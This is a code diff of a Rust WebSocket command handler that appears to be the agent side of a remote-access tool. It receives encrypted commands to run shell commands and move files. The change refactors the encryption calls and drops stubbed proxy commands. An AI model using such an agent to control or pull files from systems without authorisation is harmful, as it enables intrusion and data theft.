@@ -7,7 +7,6 @@ use tokio::sync::Mutex;
 use tokio_tungstenite::tungstenite::Message;
 use tokio_tungstenite::WebSocketStream;
 use crate::communication;
-use crate::crypto;
 use crate::command::{Command as NodeCommand, Response};
 
 pub struct RxCommandHandler {
@@ -33,18 +32,17 @@ impl RxCommandHandler {
             NodeCommand::PutFile { file_path, data } => self.upload_file(&file_path, &data).await,
             NodeCommand::Execute { command } => self.execute_command(&command).await,
             NodeCommand::ChangePassphrase { new_passphrase } => self.change_passphrase(&new_passphrase).await,
-            NodeCommand::ProxyToServer { server_address } => self.proxy_to_server(&server_address).await,
-            NodeCommand::ExitProxyMode => self.exit_proxy_mode().await,
         }
     }
     
     async fn echo_message(&self, message: &str) -> Response {
+        println!("{}", message);
         Response::Message { content: format!("[+] {}", message) }
     }
 
     async fn list_files(&self) -> Response {
         let mut file_list = vec![];
-    
+
         match fs::read_dir(".").await {
             Ok(mut entries) => {
                 while let Ok(Some(entry)) = entries.next_entry().await {
@@ -57,15 +55,14 @@ impl RxCommandHandler {
                 eprintln!("Failed to read directory: {}", e);
             }
         }
-    
+
         Response::FileList { files: file_list }
     }
-    
+
     async fn download_file(&self, file_path: &str) -> Response {
         match fs::read(file_path).await {
             Ok(file_data) => {
-                let encrypted_data = crypto::encrypt(&file_data, self.passphrase.as_bytes());
-                Response::FileData { file_path: file_path.to_string(), data: encrypted_data }
+                Response::FileData { file_path: file_path.to_string(), data: file_data }
             }
             Err(e) => {
                 eprintln!("Failed to read file {}: {}", file_path, e);
@@ -75,8 +72,7 @@ impl RxCommandHandler {
     }
 
     async fn upload_file(&self, file_path: &str, data: &[u8]) -> Response {
-        let decrypted_data = crypto::decrypt(data, self.passphrase.as_bytes());
-        match fs::write(file_path, decrypted_data).await {
+        match fs::write(file_path, data).await {
             Ok(_) => Response::Message { content: format!("File {} uploaded successfully.", file_path) },
             Err(e) => {
                 eprintln!("Failed to write file {}: {}", file_path, e);
@@ -103,21 +99,19 @@ impl RxCommandHandler {
         Response::Message { content: "Passphrase changed successfully.".to_string() }
     }
 
-    async fn proxy_to_server(&self, _server_address: &str) -> Response {
-        // Implement proxy logic if needed
-        Response::Message { content: "Proxy feature not implemented.".to_string() }
-    }
-
-    async fn exit_proxy_mode(&self) -> Response {
-        // Implement exit proxy logic if needed
-        Response::Message { content: "Exit proxy mode not implemented.".to_string() }
+    async fn process_binary_message(&mut self, data: Vec<u8>) -> Response {
+        let decrypted_data = communication::prepare_rx(data, &self.passphrase);
+        let command: NodeCommand = serde_json::from_slice(&decrypted_data)
+            .expect("Failed to deserialize command");
+    
+        self.handle_command(command).await
     }
 
     async fn send_response(&self, response: Response) {
         if let Some(ws_sender) = &self.ws_sender {
             let mut sender = ws_sender.lock().await;
             let serialized_response = serde_json::to_vec(&response).expect("Failed to serialize response");
-            let encrypted_response = crypto::encrypt(&serialized_response, self.passphrase.as_bytes());
+            let encrypted_response = communication::prepare_tx(serialized_response, &self.passphrase);
             communication::send_binary_data(&mut sender, encrypted_response).await;
         }
     }
@@ -150,13 +144,5 @@ impl RxCommandHandler {
         } else {
             None
         }
-    }
-    
-    async fn process_binary_message(&mut self, data: Vec<u8>) -> Response {
-        let decrypted_data = communication::prepare_rx(data, &self.passphrase);
-        let command: NodeCommand = serde_json::from_slice(&decrypted_data)
-            .expect("Failed to deserialize command");
-    
-        self.handle_command(command).await
     }
 }
